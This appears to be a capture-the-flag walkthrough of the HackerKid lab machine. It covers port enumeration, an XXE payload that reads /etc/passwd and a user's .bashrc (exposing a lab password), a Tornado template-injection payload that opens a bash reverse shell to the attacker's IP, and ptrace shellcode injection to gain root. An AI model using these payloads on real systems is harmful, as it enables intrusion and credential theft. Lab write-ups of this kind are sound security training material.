***Local Machine IP: `10.0.0.44`***  
***Remote Machine IP: `10.0.0.58`***

# 1. Enumeration

## NMAP

    root@kali ~/D/M/HackerKid# nmap -sS -T4 -p- -A 10.0.0.58                                          

    PORT     STATE SERVICE VERSION
    53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.16.1-Ubuntu
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Notorious Kid : A Hacker 
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    9999/tcp open  http    Tornado httpd 6.1
    | http-title: Please Log In
    |_Requested resource was /login?next=%2F
    |_http-server-header: TornadoServer/6.1

Port 53 hosts a DNS server. Searching ISC BIND and it's version found some exploits and vulnerabilities, we will get back to them later.  
We have two HTTP servers running on the remote machine as well.  
Tornado is running in port 9999. Tornado is a scalable, non-blocking web server and web application framework written in Python. 
Let's start with Port 80

## Port 80 | HTTP

![image](https://user-images.githubusercontent.com/76552238/199777862-6cd735e9-b549-466d-8010-6fbe44aeb708.png)

Looking at the comments, we a lead on a parameter that is available on the index.php page.

<!--

<div class="container py-5">
  <h1>Thanks</h1>

 TO DO: Use a GET parameter page_no  to view pages.
-->

![image](https://user-images.githubusercontent.com/76552238/199998391-b0c81787-d5be-40a1-8a6e-f7ee097a8b65.png)

Going to ***http://10.0.0.58?page_no=*** we get a little red message on the button of the ***index.php*** page.

![image](https://user-images.githubusercontent.com/76552238/199999169-2552372a-e44f-40bf-a4fa-1adfaba0c397.png)

After some fuzzing I found out that the GET parameter takes only numbers. Let's make a wordlist that holds some numbers from 1 to 10000, fuzz and see what we get. 

    root@kali ~/D/M/HackerKid# wfuzz -c -z file,numbers.txt -u '10.0.0.58/?page_no=FUZZ' --hh 3654  

    000000021:   200        116 L    310 W      3849 Ch     "21"                           

Let's go to ***http://10.0.0.58?page_no=21*** and see what we get.

![image](https://user-images.githubusercontent.com/76552238/200009482-5e7c78e7-558c-4d21-ad9a-8eeb938d0d22.png)

After adding the domain name to the /etc/hosts file we can try to find it's subdomains.

    root@kali ~/D/M/HackerKid# dig @10.0.0.58 hackers.blackhat.local                                
                                                                                                    
    ; <<>> DiG 9.18.4-2-Debian <<>> @10.0.0.58 hackers.blackhat.local
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; WARNING: .local is reserved for Multicast DNS
    ;; You are currently testing what happens when an mDNS query is leaked to DNS
    ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 51267
    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ; COOKIE: 3952f6f3ad348d8401000000636530a14eff712cadb680a2 (good)
    ;; QUESTION SECTION:
    ;hackers.blackhat.local.                IN      A

    ;; AUTHORITY SECTION:
    blackhat.local.         3600    IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600

    ;; Query time: 0 msec
    ;; SERVER: 10.0.0.58#53(10.0.0.58) (UDP)
    ;; WHEN: Fri Nov 04 11:32:48 EDT 2022
    ;; MSG SIZE  rcvd: 125

We found another subdomain ***"hackerkid.blackhat.local"***. Let's add it as well to the ***/etc/host***s file.

Going to ***"hackerkid.blackhat.local"***, we have a register page that takes some parameters.  

![image](https://user-images.githubusercontent.com/76552238/200186982-62eda4c0-0a9c-4a44-bd18-37f1a75ad0b4.png)

Let's open Burp Suite and see what happens we click the Register button.  

![image](https://user-images.githubusercontent.com/76552238/200187076-28f339da-1b31-45fa-949d-a1baa193459e.png)

After pressing the Register button, the server gets the data in ***XML*** format. Maybe we can perform an [***XXE injection***][1].

# 2. Exploitation

Let's check if we can view a file on the system.

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
    <root>
    <name></name>
    <tel></tel>
    <email>&xxe;</email>
    <password></password>
    </root>

![image](https://user-images.githubusercontent.com/76552238/200186783-aa44cfef-a92b-4af0-8862-f848bada42b9.png)

And we get the /etc/passwd file from the remote machine. After downloading it to our local machine we see what users are on the remote server.

    root@kali ~/D/M/HackerKid# cat passwd | grep /bin/bash                                         
    saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash

The remote server does not have an open SSH port, so we can't brute the login for SSH.

Because we know that the user ***"saket"*** is on the remote machine, let's try to read files from it's home directory. Trying to read the .bashrc file doesn't work.

Maybe we can as PHP wrapper with the XXE injection to get the file as base64 and decoded it.

Using [***this***][2] github post I was able to exploit the web server to show the .bashrc file.

***/home/saket/.bashrc Dedoced:***

    # ~/.bashrc: executed by bash(1) for non-login shells.
    # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
    # for examples

    # If not running interactively, don't do anything
    case $- in
        *i*) ;;
          *) return;;
    esac

    # don't put duplicate lines or lines starting with space in the history.
    # See bash(1) for more options
    HISTCONTROL=ignoreboth

    # append to the history file, don't overwrite it
    shopt -s histappend

    # for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
    HISTSIZE=1000
    HISTFILESIZE=2000

    # check the window size after each command and, if necessary,
    # update the values of LINES and COLUMNS.
    shopt -s checkwinsize

    # If set, the pattern "**" used in a pathname expansion context will
    # match all files and zero or more directories and subdirectories.
    #shopt -s globstar

    # make less more friendly for non-text input files, see lesspipe(1)
    [ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

    # set variable identifying the chroot you work in (used in the prompt below)
    if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
        debian_chroot=$(cat /etc/debian_chroot)
    fi

    # set a fancy prompt (non-color, unless we know we "want" color)
    case "$TERM" in
        xterm-color|*-256color) color_prompt=yes;;
    esac

    # uncomment for a colored prompt, if the terminal has the capability; turned
    # off by default to not distract the user: the focus in a terminal window
    # should be on the output of commands, not on the prompt
    #force_color_prompt=yes

    if [ -n "$force_color_prompt" ]; then
        if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
      # We have color support; assume it's compliant with Ecma-48
      # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
      # a case would tend to support setf rather than setaf.)
      color_prompt=yes
        else
      color_prompt=
        fi
    fi

    if [ "$color_prompt" = yes ]; then
        PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
    else
        PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
    fi
    unset color_prompt force_color_prompt

    # If this is an xterm set the title to user@host:dir
    case "$TERM" in
    xterm*|rxvt*)
        PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
        ;;
    *)
        ;;
    esac

    # enable color support of ls and also add handy aliases
    if [ -x /usr/bin/dircolors ]; then
        test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
        alias ls='ls --color=auto'
        #alias dir='dir --color=auto'
        #alias vdir='vdir --color=auto'

        alias grep='grep --color=auto'
        alias fgrep='fgrep --color=auto'
        alias egrep='egrep --color=auto'
    fi

    # colored GCC warnings and errors
    #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

    # some more ls aliases
    alias ll='ls -alF'
    alias la='ls -A'
    alias l='ls -CF'

    # Add an "alert" alias for long running commands.  Use like so:
    #   sleep 10; alert
    alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

    # Alias definitions.
    # You may want to put all your additions into a separate file like
    # ~/.bash_aliases, instead of adding them here directly.
    # See /usr/share/doc/bash-doc/examples in the bash-doc package.

    if [ -f ~/.bash_aliases ]; then
        . ~/.bash_aliases
    fi

    # enable programmable completion features (you don't need to enable
    # this, if it's already enabled in /etc/bash.bashrc and /etc/profile
    # sources /etc/bash.bashrc).
    if ! shopt -oq posix; then
      if [ -f /usr/share/bash-completion/bash_completion ]; then
        . /usr/share/bash-completion/bash_completion
      elif [ -f /etc/bash_completion ]; then
        . /etc/bash_completion
      fi
    fi

    #Setting Password for running python app
    username="admin"
    password="Saket!#$%@!!"

Looking at the bottom of the file we have the credentials for a user.

    #Setting Password for running python app
    username="admin"
    password="Saket!#$%@!!"

Trying the credentials on the service running on port 9999 didn't work, but changing the username to ***"saket"*** works.

![image](https://user-images.githubusercontent.com/76552238/200188463-6eed3b40-25a2-4a92-a23b-5a8619283b4b.png)

The web server asks for our name, let's try adding a parameter named ***"name"*** to the url.

***http://10.0.0.58:9999?name=something:***

![image](https://user-images.githubusercontent.com/76552238/200188543-8ba9ef96-8f3e-48e4-bdbb-66514595b33e.png)

We found a working parameter. According to our NMAP scan at the start we know that the server on port 9999 is being run by a Python app.  
We can exploit the server for SSTI. 

    Payload:

    {% import os %}{{ os.system("bash -c 'bash -i >& /dev/tcp/10.0.0.44/4444 0>&1'") }}

    URL encoded Payload:

    %7B%25%20import%20os%20%25%7D%7B%7B%20os.system(%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.44%2F4444%200%3E%261%27%22)%20%7D%7D%0A

Going to ***"http://10.0.0.58:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7B%20os.system(%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.44%2F4444%200%3E%261%27%22)%20%7D%7D%0A"***, we get a reverse shell on the remote server as the user ***"saket"***.

<!--http://10.0.0.58:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7B%20os.system(%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.44%2F4444%200%3E%261%27%22)%20%7D%7D%0A-->

    Local Machine

    root@kali ~/D/M/HackerKid [1]# nc -lnvp 4444                                                    
    listening on [any] 4444 ...                                                                     
    connect to [10.0.0.44] from (UNKNOWN) [10.0.0.58] 43452
    bash: cannot set terminal process group (686): Inappropriate ioctl for device
    bash: no job control in this shell
    saket@ubuntu:~$ 

# 3. Privilege Escalation

After gaining access to the system, I ran ***[linPeas][3]*** and found out an interesting file.

    saket@ubuntu:~$ /usr/sbin/getcap /usr/bin/python2.7
    /usr/bin/python2.7 = cap_sys_ptrace+ep

Using this [***video***][4] and this [***article***][5] I was able to exploit the "***SYS_PTRACE capability***".

    root         836       1  0 09:09 ?        00:00:00 /usr/sbin/apache2 -k start

    saket@ubuntu:/tmp/exploit$ python2.7 inject.py 836
    python2.7 inject.py 836
    Instruction Pointer: 0x7fc1c1a2f0daL
    Injecting Shellcode at: 0x7fc1c1a2f0daL
    Shellcode Injected!!
    Final Instruction Pointer: 0x7fc1c1a2f0dcL

>

    $ ss -tnlp

    LISTEN    0         0                  0.0.0.0:5600             0.0.0.0:*                                                                                       
We can connect to the remote machine from our local machine.

    root@kali ~/D/M/HackerKid# nc 10.0.0.58 5600                                                    
    id -a                                                                                           
    uid=0(root) gid=0(root) groups=0(root)


[1]: "https://portswigger.net/web-security/xxe"

[2]: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20PHP%20Wrapper.xml"

[3]: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"

[4]: "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
<!-- :) This is the real video ==> https://www.youtube.com/watch?v=vYfZvNSYzKQ -->

[5]: "https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc"